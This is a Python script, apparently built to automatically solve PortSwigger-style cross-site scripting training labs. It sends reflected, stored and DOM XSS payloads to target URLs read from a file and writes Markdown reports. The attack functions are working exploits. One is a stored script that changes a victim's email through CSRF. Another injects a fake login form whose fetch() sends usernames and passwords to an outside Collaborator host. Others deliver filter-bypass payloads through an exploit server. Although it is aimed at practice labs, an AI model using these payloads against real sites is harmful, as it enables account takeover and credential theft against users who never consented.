import requests
from bs4 import BeautifulSoup
import re
import os
from datetime import datetime
from colorama import Fore, Style, init
from urllib.parse import urlencode, urlparse

# Initialize Colorama for cross-platform compatibility
init(autoreset=True)

# Define paths relative to the project root
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOGS_DIR = os.path.join(PROJECT_ROOT, "logs")
REPORTS_DIR = os.path.join(PROJECT_ROOT, "report")
PAYLOADS_DIR = os.path.join(PROJECT_ROOT, "payloads") 

# Ensure directories exist
os.makedirs(LOGS_DIR, exist_ok=True)
os.makedirs(REPORTS_DIR, exist_ok=True)
os.makedirs(PAYLOADS_DIR, exist_ok=True)

def log_message(message, level="INFO", log_file="xss_solver.log"):
    """Logs messages to a specified log file and prints to console with color."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    color = ""
    prefix = ""
    if level == "INFO":
        color = Fore.CYAN
    elif level == "WARNING":
        color = Fore.YELLOW
    elif level == "ERROR":
        color = Fore.RED
    elif level == "SUCCESS":
        color = Fore.GREEN
        prefix = "🎉 " # Add a celebration emoji for success
    elif level == "DEBUG":
        color = Fore.MAGENTA
    
    console_output = f"{color}[{timestamp}] [{level}] {prefix}{message}{Style.RESET_ALL}"
    file_output = f"[{timestamp}] [{level}] {message}"
    
    with open(os.path.join(LOGS_DIR, log_file), "a") as f:
        f.write(file_output + "\n")
    print(console_output)

def create_report(lab_name, url, method, payload, status, vulnerable_parameter=None, attack_method_name="N/A", response_text=None, request_details=None, form_fields=None):
    """
    Creates a detailed report in a more readable Markdown-like format,
    including vulnerability specifics and potentially form fields.
    """
    sanitized_lab_name = re.sub(r'[^\w\-_\. ]', '', lab_name).replace(' ', '_')
    report_filename = f"{sanitized_lab_name}_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    report_path = os.path.join(REPORTS_DIR, report_filename)
    
    with open(report_path, "w") as f:
        f.write(f"# XSS Lab Report: {lab_name}\n\n")
        f.write(f"**Date & Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"**Status:** **{status}**\n\n")
        
        f.write(f"## Vulnerability Details\n")
        f.write(f"- **Type:** {'Stored XSS' if vulnerable_parameter and ('comment' in vulnerable_parameter.lower() or 'website' in vulnerable_parameter.lower()) else 'Reflected/DOM XSS'}\n")
        f.write(f"- **Vulnerable Parameter:** `{vulnerable_parameter if vulnerable_parameter else 'Not specified'}`\n")
        f.write(f"- **Attack Method Used:** `{attack_method_name}`\n")
        f.write(f"- **Payload Used:** `{payload}`\n")
        
        f.write(f"## Request Information\n")
        f.write(f"**Method:** `{method}`\n")
        f.write(f"**Target URL:** `{url}`\n")
        if form_fields:
            f.write(f"**Form Fields (if POST):**\n")
            f.write(f"```json\n")
            for field, value in form_fields.items():
                # Avoid displaying raw HTML/JS in report directly, just indicate it was there
                display_value = value
                if isinstance(value, str) and ("<script" in value or "<img" in value or "javascript:" in value):
                    display_value = f"[XSS Payload - truncated or encoded for display: {value[:100]}...]"
                f.write(f'  "{field}": "{display_value}"\n')
            f.write(f"```\n\n")

        if request_details:
            f.write(f"**Full Request (Simplified):**\n")
            f.write(f"```http\n")
            f.write(request_details + "\n")
            f.write(f"```\n\n")
        
        if response_text:
            f.write(f"## Response Details\n")
            f.write(f"```html\n")
            # Try to find and highlight the payload in the response snippet
            snippet_start = response_text.find(payload)
            if snippet_start != -1:
                start_index = max(0, snippet_start - 200)
                end_index = min(len(response_text), snippet_start + len(payload) + 200)
                f.write(response_text[start_index:end_index] + "\n")
                if len(response_text) > end_index or snippet_start - 200 > 0:
                    f.write("\n... (Full response truncated for brevity) ...\n")
            else:
                f.write("Payload not directly found in relevant snippet. Showing beginning of response.\n")
                f.write(response_text[:1000] + "\n...\n")
            f.write(f"```\n")
            f.write(f"\n**Full Response Length:** {len(response_text)} bytes\n")

    log_message(f"Report generated: {report_path}", level="INFO")

def read_payloads(payloads_file="xss_payloads.txt"):
    """Reads XSS payloads from a specified file."""
    payloads_path = os.path.join(PAYLOADS_DIR, payloads_file)
    payloads = []
    try:
        with open(payloads_path, "r") as f:
            for line in f:
                payload = line.strip()
                if payload and not payload.startswith("#"):
                    payloads.append(payload)
        log_message(f"Loaded {len(payloads)} payloads from {payloads_path}", level="INFO")
    except FileNotFoundError:
        log_message(f"Payloads file not found: {payloads_path}. Please create it.", level="ERROR", log_file="xss_errors.log")
    return payloads

def read_targets(targets_file="targets.txt"):
    """
    Reads target URLs from a specified file.
    Each line should contain only a URL.
    """
    targets_path = os.path.join(LOGS_DIR, targets_file)
    urls = []
    try:
        with open(targets_path, "r") as f:
            for line in f:
                url = line.strip()
                if url and not url.startswith("#"):
                    urls.append(url)
        log_message(f"Loaded {len(urls)} targets from {targets_path}", level="INFO")
    except FileNotFoundError:
        log_message(f"Targets file not found: {targets_path}. Please create it.", level="ERROR", log_file="xss_errors.log")
    return urls

# --- Saldırı Metodu Fonksiyonları ---
# Her fonksiyon, belirli bir XSS saldırı tekniğini temsil eder.
# Başarılı olursa True döner ve raporlama bilgilerini loglar.
# Başarısız olursa False döner.

def fetch_page_with_session_and_csrf(base_url, post_id="1"):
    """Fetches a post page to extract session cookie and CSRF token."""
    post_page_url = f"{base_url.rstrip('/')}/post?postId={post_id}"
    try:
        initial_response = requests.get(post_page_url, timeout=15)
        initial_response.raise_for_status()
        
        session_cookie = initial_response.cookies.get("session")
        csrf_match = re.findall(r"name=\"csrf\" value=\"(.+?)\"", initial_response.text)
        csrf_token = csrf_match[0] if csrf_match else None

        if not session_cookie:
            log_message(f"WARNING: Session cookie not found for {base_url}.", level="WARNING")
        if not csrf_token:
            log_message(f"ERROR: CSRF token not found for {base_url}. Cannot proceed with comment post.", level="ERROR", log_file="xss_errors.log")
            return None, None, None
        return initial_response, session_cookie, csrf_token
    except requests.exceptions.RequestException as e:
        log_message(f"ERROR: Failed to fetch post page {post_page_url} - {e}", level="ERROR", log_file="xss_errors.log")
        return None, None, None

def attack_get_parameter_xss(base_url, payload, lab_name, parameter_name="search", path="/", check_path=None):
    """
    Attacks a GET-based parameter for Reflected/DOM XSS.
    Generalized for various GET parameters and paths.
    """
    method_name = f"GET Parameter XSS (Param: '{parameter_name}', Path: '{path}')"
    log_message(f"Trying Attack Method: {method_name} with payload '{payload}'", level="DEBUG")

    full_url_with_payload = f"{base_url.rstrip('/')}{path}?{parameter_name}={payload}"
    http_method = "GET"
    
    # Special handling for canonical link tag lab where payload is directly appended
    if parameter_name == "direct_url_append": # Custom internal flag
        full_url_with_payload = f"{base_url.rstrip('/')}{path}{payload}"
        method_name = f"GET Direct URL Append XSS (Path: '{path}')"


    request_details_for_report = f"{http_method} {urlparse(full_url_with_payload).path}?{urlparse(full_url_with_payload).query} HTTP/1.1\nHost: {urlparse(base_url).netloc}\nUser-Agent: Python-Requests/{requests.__version__}"
    
    try:
        response = requests.get(full_url_with_payload, timeout=15)
        
        if "Congratulations, you solved the lab!" in response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            log_message(f"Vulnerable Parameter: '{parameter_name}'", level="SUCCESS")
            log_message(f"Method Used: {http_method}", level="SUCCESS")
            log_message(f"Payload Used: {payload}", level="SUCCESS")
            log_message(f"Attack Method: {method_name}", level="SUCCESS")
            
            create_report(
                lab_name=lab_name,
                url=full_url_with_payload,
                method=http_method,
                payload=payload,
                status="SOLVED",
                vulnerable_parameter=parameter_name,
                attack_method_name=method_name,
                response_text=response.text,
                request_details=request_details_for_report
            )
            return True
        
        # For labs where the solution is triggered on a different page (e.g., /feedback for returnPath)
        if check_path:
            check_url = f"{base_url.rstrip('/')}{check_path}"
            check_response = requests.get(check_url, timeout=15)
            if "Congratulations, you solved the lab!" in check_response.text:
                log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} (Triggered on {check_path}) !!!", level="SUCCESS")
                log_message(f"Vulnerable Parameter: '{parameter_name}'", level="SUCCESS")
                log_message(f"Method Used: {http_method}", level="SUCCESS")
                log_message(f"Payload Used: {payload}", level="SUCCESS")
                log_message(f"Attack Method: {method_name}", level="SUCCESS")
                
                create_report(
                    lab_name=lab_name,
                    url=check_url, # Report the URL where it was solved
                    method=http_method,
                    payload=payload,
                    status="SOLVED",
                    vulnerable_parameter=parameter_name,
                    attack_method_name=f"{method_name} (Triggered on {check_path})",
                    response_text=check_response.text,
                    request_details=request_details_for_report
                )
                return True

    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Request failed for {full_url_with_payload} - {e}", level="ERROR", log_file="xss_errors.log")
        pass 
    return False

def attack_post_form_xss(base_url, payload, lab_name, target_field="comment", other_form_fields=None):
    """
    Attacks a POST-based form for Stored XSS.
    Generalized for different target fields and additional form data.
    """
    method_name = f"POST Form XSS (Target Field: '{target_field}')"
    log_message(f"Trying Attack Method: {method_name} with payload '{payload}'", level="DEBUG")

    initial_response, session_cookie, csrf_token = fetch_page_with_session_and_csrf(base_url)
    if not csrf_token:
        return False

    comment_submit_path = "/post/comment"
    post_target_url = f"{base_url.rstrip('/')}{comment_submit_path}"
    blog_page_url_to_check = f"{base_url.rstrip('/')}/post?postId=1" # Assumes labs trigger on blog post 1

    http_method = "POST"
    
    form_data = {
        "csrf": csrf_token,
        "postId": "1",
        "name": "Hacker",
        "email": "hack@me.com",
    }
    form_data[target_field] = payload

    if other_form_fields:
        form_data.update(other_form_fields) # Add/override other fields

    cookies_to_send = {"session": session_cookie} if session_cookie else {}
    encoded_form_data = urlencode(form_data)

    request_details_for_report = (
        f"{http_method} {comment_submit_path} HTTP/1.1\n"
        f"Host: {urlparse(base_url).netloc}\n"
        f"User-Agent: Python-Requests/{requests.__version__}\n"
        f"Cookie: session={session_cookie}\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Content-Length: {len(encoded_form_data)}\n\n"
        f"{encoded_form_data}"
    )

    try:
        response = requests.post(post_target_url, data=form_data, cookies=cookies_to_send, timeout=15, allow_redirects=True)

        if "Congratulations, you solved the lab!" in response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            log_message(f"Vulnerable Parameter: '{target_field}' (POST field)", level="SUCCESS")
            log_message(f"Method Used: {http_method}", level="SUCCESS")
            log_message(f"Payload Used: {payload}", level="SUCCESS")
            log_message(f"Attack Method: {method_name}", level="SUCCESS")
            
            create_report(
                lab_name=lab_name,
                url=response.url,
                method=http_method, 
                payload=payload,
                status="SOLVED",
                vulnerable_parameter=target_field,
                attack_method_name=method_name,
                response_text=response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True

        # Check the blog page explicitly if not solved directly
        blog_response = requests.get(blog_page_url_to_check, cookies=cookies_to_send, timeout=15)
        if "Congratulations, you solved the lab!" in blog_response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} (Triggered on Blog Page) !!!", level="SUCCESS")
            log_message(f"Vulnerable Parameter: '{target_field}' (POST field)", level="SUCCESS")
            log_message(f"Method Used: {http_method}", level="SUCCESS")
            log_message(f"Payload Used: {payload}", level="SUCCESS")
            log_message(f"Attack Method: {method_name}", level="SUCCESS")
            
            create_report(
                lab_name=lab_name,
                url=blog_page_url_to_check, 
                method=http_method, 
                payload=payload,
                status="SOLVED",
                vulnerable_parameter=target_field,
                attack_method_name=f"{method_name} (Triggered on Blog Page)",
                response_text=blog_response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True

    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Request failed for {post_target_url} - {e}", level="ERROR", log_file="xss_errors.log")
        pass 
    return False

def attack_exploit_server_xss(base_url, lab_name, exploit_server_url, exploit_html_payload, description="Exploit Server XSS"):
    """
    Delivers an XSS exploit via a user-controlled exploit server.
    This function requires the user to provide their Burp Exploit Server URL.
    """
    method_name = f"Exploit Server: {description}"
    log_message(f"Trying Attack Method: {method_name}", level="DEBUG")
    
    if "YOUR_EXPLOIT_SERVER_URL" in exploit_server_url:
        log_message(f"WARNING: EXPLOIT_SERVER_URL is a placeholder for {method_name}. Please update it in the script.", level="WARNING")
        return False

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    data = { 
        "responseBody": exploit_html_payload, 
        "responseHead": response_head, 
        "formAction": "DELIVER_TO_VICTIM", 
        "urlIsHttps": "on", 
        "responseFile": "/exploit" 
    }

    try:
        log_message(f"Delivering exploit to victim via {exploit_server_url}...", level="INFO")
        response = requests.post(exploit_server_url, data, timeout=15)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        
        # Exploit server labs are usually solved by the victim visiting the exploit,
        # so we check if the lab URL itself is marked as solved after exploit delivery.
        # This is a common pattern for Burp Suite labs.
        # We assume the solution is checked on the main page of the lab.
        check_lab_response = requests.get(base_url, timeout=15)
        if "Congratulations, you solved the lab!" in check_lab_response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=base_url, # Report the lab URL, not the exploit server URL
                method="POST", # Method for delivering the exploit
                payload=exploit_html_payload,
                status="SOLVED",
                vulnerable_parameter="N/A (Exploit Server)",
                attack_method_name=method_name,
                response_text=check_lab_response.text,
                request_details=f"POST {urlparse(exploit_server_url).path} HTTP/1.1\nHost: {urlparse(exploit_server_url).netloc}\nContent-Type: application/x-www-form-urlencoded\n\n[Exploit HTML Body]"
            )
            return True

    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Failed to deliver exploit via {exploit_server_url} - {e}", level="ERROR", log_file="xss_errors.log")
        pass
    return False

def attack_exploit_server_hashchange_iframe(base_url, lab_name, exploit_server_url="YOUR_EXPLOIT_SERVER_URL"):
    """
    Lab: DOM XSS in jQuery selector sink using a hashchange event.
    Exploit: iframe with onload that appends img to hash.
   
    """
    # Düzeltme: Üçlü çift tırnaklar yerine üçlü tek tırnaklar kullanıldı.
    exploit_html_payload = f'''<iframe src="{base_url}/#" onload="this.src+='<img src=1 onerror=print()>'">'''
    return attack_exploit_server_xss(base_url, lab_name, exploit_server_url, exploit_html_payload, "DOM XSS via Hashchange Event (Exploit Server)")

def attack_exploit_server_reflected_custom_tags(base_url, lab_name, exploit_server_url="YOUR_EXPLOIT_SERVER_URL"):
    """
    Lab: Reflected XSS into HTML context with all tags blocked except custom ones.
    Exploit: Script redirecting to lab URL with specific payload.
   
    """
    payload_for_lab_url = "<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"
    # Düzeltme: Üçlü çift tırnaklar yerine üçlü tek tırnaklar kullanıldı.
    exploit_html_payload = f'''<script>
                    location = "{base_url}/?search={payload_for_lab_url}"
                </script>'''
    return attack_exploit_server_xss(base_url, lab_name, exploit_server_url, exploit_html_payload, "Reflected XSS with Custom Tags (Exploit Server)")

def attack_exploit_server_reflected_body_resize(base_url, lab_name, exploit_server_url="YOUR_EXPLOIT_SERVER_URL"):
    """
    Lab: Reflected XSS into HTML context with most tags and attributes blocked.
    Exploit: iframe with onload that changes body width to trigger onresize.
   
    """
    payload_for_lab_url = "<body onresize=print()>"
    # Düzeltme: Üçlü çift tırnaklar yerine üçlü tek tırnaklar kullanıldı.
    exploit_html_payload = f'''<iframe src="{base_url}/?search={payload_for_lab_url}" onload=this.style.width='100px'>'''
    return attack_exploit_server_xss(base_url, lab_name, exploit_server_url, exploit_html_payload, "Reflected XSS with Body Resize (Exploit Server)")

def attack_post_comment_form_csrf_xss(base_url, lab_name):
    """
    Lab: Exploiting XSS to perform CSRF.
    Posts a specific JavaScript payload to the comment field to change victim's email.
   
    """
    method_name = "POST Comment Form XSS (CSRF Email Change)"
    log_message(f"Trying Attack Method: {method_name}", level="DEBUG")

    initial_response, session_cookie, csrf_token = fetch_page_with_session_and_csrf(base_url)
    if not csrf_token:
        return False
    
    # Specific payload for CSRF lab to change email
    payload = f"""<script>
                        window.onload = function(){{
                            var token = document.forms[0].firstElementChild.value;
                            fetch("{base_url}/my-account/change-email", {{
                                method: "POST",
                                headers: {{
                                    "Content-Type":  "application/x-www-form-urlencoded"
                                }},
                                body: "csrf=" + token + "&email=hacked@you.com" 
                            }});
                        }};
                    </script>"""
    
    form_data = { 
        "comment": payload, 
        "csrf": csrf_token, 
        "postId": "1", 
        "name": "Hacker", 
        "email": "hack@me.com" 
    }
    cookies_to_send = { "session": session_cookie } if session_cookie else {}

    comment_submit_path = "/post/comment"
    post_target_url = f"{base_url.rstrip('/')}{comment_submit_path}"
    blog_page_url_to_check = f"{base_url.rstrip('/')}/post?postId=1" # Assumes lab is solved on blog page

    encoded_form_data = urlencode(form_data)
    request_details_for_report = (
        f"POST {comment_submit_path} HTTP/1.1\n"
        f"Host: {urlparse(base_url).netloc}\n"
        f"User-Agent: Python-Requests/{requests.__version__}\n"
        f"Cookie: session={session_cookie}\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Content-Length: {len(encoded_form_data)}\n\n"
        f"{encoded_form_data}"
    )

    try:
        response = requests.post(post_target_url, data=form_data, cookies=cookies_to_send, timeout=15, allow_redirects=True)

        if "Congratulations, you solved the lab!" in response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=response.url,
                method="POST", 
                payload=payload,
                status="SOLVED",
                vulnerable_parameter="comment",
                attack_method_name=method_name,
                response_text=response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True
        
        # Check the blog page explicitly if not solved directly
        blog_response = requests.get(blog_page_url_to_check, cookies=cookies_to_send, timeout=15)
        if "Congratulations, you solved the lab!" in blog_response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} (Triggered on Blog Page) !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=blog_page_url_to_check, 
                method="POST", 
                payload=payload,
                status="SOLVED",
                vulnerable_parameter="comment",
                attack_method_name=f"{method_name} (Triggered on Blog Page)",
                response_text=blog_response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True

    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Request failed for {post_target_url} - {e}", level="ERROR", log_file="xss_errors.log")
        pass
    return False

def attack_post_comment_form_capture_passwords_xss(base_url, lab_name, burp_collaborator_url="YOUR_BURP_COLLABORATOR_URL"):
    """
    Lab: Exploiting cross-site scripting to capture passwords.
    Posts a specific JavaScript payload to the comment field to send credentials to Burp Collaborator.
   
    """
    method_name = "POST Comment Form XSS (Capture Passwords)"
    log_message(f"Trying Attack Method: {method_name}", level="DEBUG")

    if "YOUR_BURP_COLLABORATOR_URL" in burp_collaborator_url:
        log_message(f"WARNING: BURP_COLLABORATOR_URL is a placeholder for {method_name}. Please update it in the script.", level="WARNING")
        return False

    initial_response, session_cookie, csrf_token = fetch_page_with_session_and_csrf(base_url)
    if not csrf_token:
        return False
    
    # Specific payload for password capture lab
    payload = f"""<input name=username id=username>
                <input name=password type=password
                    onchange="if(this.value.length){{fetch('https://{burp_collaborator_url}',{{
                        method:'POST',
                        mode: 'no-cors',
                        body: username.value+':'+this.value
                    }});
                }}">"""
    
    form_data = { 
        "comment": payload, 
        "csrf": csrf_token, 
        "postId": "1", 
        "name": "Hacker", 
        "email": "hack@me.com" 
    }
    cookies_to_send = { "session": session_cookie } if session_cookie else {}

    comment_submit_path = "/post/comment"
    post_target_url = f"{base_url.rstrip('/')}{comment_submit_path}"
    blog_page_url_to_check = f"{base_url.rstrip('/')}/post?postId=1" 

    encoded_form_data = urlencode(form_data)
    request_details_for_report = (
        f"POST {comment_submit_path} HTTP/1.1\n"
        f"Host: {urlparse(base_url).netloc}\n"
        f"User-Agent: Python-Requests/{requests.__version__}\n"
        f"Cookie: session={session_cookie}\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Content-Length: {len(encoded_form_data)}\n\n"
        f"{encoded_form_data}"
    )

    try:
        response = requests.post(post_target_url, data=form_data, cookies=cookies_to_send, timeout=15, allow_redirects=True)

        if "Congratulations, you solved the lab!" in response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=response.url,
                method="POST", 
                payload=payload,
                status="SOLVED",
                vulnerable_parameter="comment",
                attack_method_name=method_name,
                response_text=response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True
        
        # Check the blog page explicitly if not solved directly
        blog_response = requests.get(blog_page_url_to_check, cookies=cookies_to_send, timeout=15)
        if "Congratulations, you solved the lab!" in blog_response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} (Triggered on Blog Page) !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=blog_page_url_to_check, 
                method="POST", 
                payload=payload,
                status="SOLVED",
                vulnerable_parameter="comment",
                attack_method_name=f"{method_name} (Triggered on Blog Page)",
                response_text=blog_response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True

    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Request failed for {post_target_url} - {e}", level="ERROR", log_file="xss_errors.log")
        pass
    return False


# Tüm saldırı metodlarını bir liste olarak tanımla
# Sıra önemli değil, hepsi her labda denenecek
ATTACK_METHODS = [
    # Genel GET tabanlı saldırılar (Payload'lar xss_payloads.txt'den okunur)
    lambda base_url, payload, lab_name: attack_get_parameter_xss(base_url, payload, lab_name, parameter_name="search", path="/"),
    
    # Genel POST tabanlı saldırılar (Payload'lar xss_payloads.txt'den okunur)
    # Comment alanı için
    lambda base_url, payload, lab_name: attack_post_form_xss(base_url, payload, lab_name, target_field="comment"),
    # Website alanı için (stored XSS labs)
    lambda base_url, payload, lab_name: attack_post_form_xss(base_url, payload, lab_name, target_field="website", other_form_fields={"comment": "test_comment"}), 

    # Özel GET tabanlı saldırılar (Özel path/parametreler)
    # DOM XSS in jQuery anchor href attribute sink using location.search source
    lambda base_url, payload, lab_name: attack_get_parameter_xss(base_url, payload, lab_name, parameter_name="returnPath", path="/feedback"),
    # Reflected XSS in canonical link tag
    lambda base_url, payload, lab_name: attack_get_parameter_xss(base_url, payload, lab_name, parameter_name="direct_url_append", path="/"),


    # Exploit Sunucusu Gerektiren Saldırılar (EXPLOIT_SERVER_URL'yi değiştirmeyi unutmayın!)
    attack_exploit_server_hashchange_iframe,
    attack_exploit_server_reflected_custom_tags,
    attack_exploit_server_reflected_body_resize,

    # Özel POST tabanlı saldırılar (Karmaşık ve Lab'a özgü payload'lar içerir)
    attack_post_comment_form_csrf_xss,
    attack_post_comment_form_capture_passwords_xss,
]

def main():
    log_message("Starting XSS Lab Solver (Multi-Method Scan)...", level="INFO")
    
    payloads = read_payloads()
    # Özel payload'lar için ek kontrol, çünkü bazıları doğrudan fonksiyonlara gömülü.
    # Ancak genel payload dosyası boşsa yine de uyarmalıyız.
    if not payloads:
        log_message("No generic payloads loaded from xss_payloads.txt. Ensure this file exists for broader testing.", level="WARNING")

    targets = read_targets()
    if not targets:
        log_message("No targets loaded. Exiting.", level="ERROR")
        return
    
    overall_lab_results = {} 
    detailed_solution_info = {} 

    # Tekrar eden Burp Collaborator ve Exploit Server uyarılarını önlemek için setler
    warned_collaborator = False
    warned_exploit_server = False

    for i, target_url in enumerate(targets):
        lab_name_to_use = f"Target Lab {i+1}" 

        if "YOUR_BURP_LAB" in target_url:
            log_message(f"WARNING: Placeholder URL found for {lab_name_to_use}: {target_url}. Please replace it with an actual lab URL.", level="WARNING", log_file="xss_solver_warnings.log")
            overall_lab_results[lab_name_to_use] = "SKIPPED (Placeholder URL)"
            continue
        
        log_message(f"\n***** Processing Target {i+1} of {len(targets)}: {target_url} *****", level="INFO")
        log_message(f"Attempting to solve '{target_url}' using all defined attack methods...", level="INFO")

        lab_solved_by_any_method = False
        
        for attack_method_func in ATTACK_METHODS:
            # Check if exploit server URL needs to be configured
            if "exploit_server_xss" in attack_method_func.__name__ and "YOUR_EXPLOIT_SERVER_URL" in (attack_method_func.__defaults__[0] if attack_method_func.__defaults__ else []) and not warned_exploit_server:
                log_message("For Exploit Server labs, please update 'YOUR_EXPLOIT_SERVER_URL' in the script.", level="WARNING", log_file="xss_solver_warnings.log")
                warned_exploit_server = True
                
            # Check if Burp Collaborator URL needs to be configured
            if "capture_passwords_xss" in attack_method_func.__name__ and "YOUR_BURP_COLLABORATOR_URL" in (attack_method_func.__defaults__[0] if attack_method_func.__defaults__ else []) and not warned_collaborator:
                log_message("For Password Capture labs, please update 'YOUR_BURP_COLLABORATOR_URL' in the script.", level="WARNING", log_file="xss_solver_warnings.log")
                warned_collaborator = True

            # General GET/POST attacks should iterate through all payloads
            # We need to check if the attack_method_func is a lambda and if it calls a specific function
            # This is a bit tricky with lambdas, so we'll check by name or a more robust way
            # For simplicity, I'll assume that direct function references (not lambdas) are the specific ones.
            # And lambdas that wrap general functions will iterate payloads.
            is_general_payload_attack = False
            if hasattr(attack_method_func, '__name__') and ('attack_get_parameter_xss' in attack_method_func.__name__ or 'attack_post_form_xss' in attack_method_func.__name__):
                 is_general_payload_attack = True
            elif not hasattr(attack_method_func, '__name__') and len(attack_method_func.__code__.co_varnames) > 1 and 'payload' in attack_method_func.__code__.co_varnames:
                # This is a heuristic for lambdas that take a payload argument
                is_general_payload_attack = True


            if is_general_payload_attack:
                for payload in payloads:
                    if attack_method_func(target_url, payload, lab_name_to_use):
                        log_message(f"Successfully solved '{lab_name_to_use}' with method '{attack_method_func.__name__ if hasattr(attack_method_func, '__name__') else 'Lambda Function'}' and payload '{payload}'", level="SUCCESS")
                        detailed_solution_info[target_url] = {
                            "lab_name": lab_name_to_use,
                            "attack_method": attack_method_func.__name__ if hasattr(attack_method_func, '__name__') else 'Lambda Function',
                            "payload": payload,
                            "url": target_url
                        }
                        overall_lab_results[lab_name_to_use] = "SOLVED"
                        lab_solved_by_any_method = True
                        break 
                if lab_solved_by_any_method:
                    break 
            else: # Specific attacks don't need to iterate payloads (they have internal ones)
                # These specific functions don't take a 'payload' argument directly from the loop
                # They might take exploit_server_url or burp_collaborator_url from their defaults
                if attack_method_func(target_url, lab_name_to_use):
                    log_message(f"Successfully solved '{lab_name_to_use}' with method '{attack_method_func.__name__}'", level="SUCCESS")
                    detailed_solution_info[target_url] = {
                        "lab_name": lab_name_to_use,
                        "attack_method": attack_method_func.__name__,
                        "payload": "Internal/Specific Payload", # Indicate payload is internal
                        "url": target_url
                    }
                    overall_lab_results[lab_name_to_use] = "SOLVED"
                    lab_solved_by_any_method = True
                    break 
        
        if not lab_solved_by_any_method:
            overall_lab_results[lab_name_to_use] = "NOT SOLVED"
            log_message(f"--- Lab: {lab_name_to_use} ({target_url}) NOT SOLVED with any current methods/payloads. ---", level="WARNING")
    
    # Final Summary - concise and at the end
    log_message("\n" + "="*50, level="INFO")
    log_message("--- XSS Lab Solver - Final Summary ---", level="INFO")
    log_message("="*50, level="INFO")

    for lab_name, status in overall_lab_results.items():
        if status == "SOLVED":
            log_message(f"- {lab_name}: {status}", level="SUCCESS")
            found_url = None
            for url, details in detailed_solution_info.items():
                if details["lab_name"] == lab_name:
                    found_url = url
                    break
            
            if found_url and found_url in detailed_solution_info:
                info = detailed_solution_info[found_url]
                log_message(f"  > Solved by: {info['attack_method']}", level="SUCCESS")
                log_message(f"  > Payload: {info['payload']}", level="SUCCESS")
                log_message(f"  > URL: {info['url']}", level="SUCCESS")
        elif status == "NOT SOLVED":
            log_message(f"- {lab_name}: {status}", level="WARNING")
        else: # SKIPPED
            log_message(f"- {lab_name}: {status}", level="INFO")
    
    log_message("="*50 + "\n", level="INFO")
    log_message("XSS Lab Solver finished.", level="INFO")

if __name__ == "__main__":
    main()
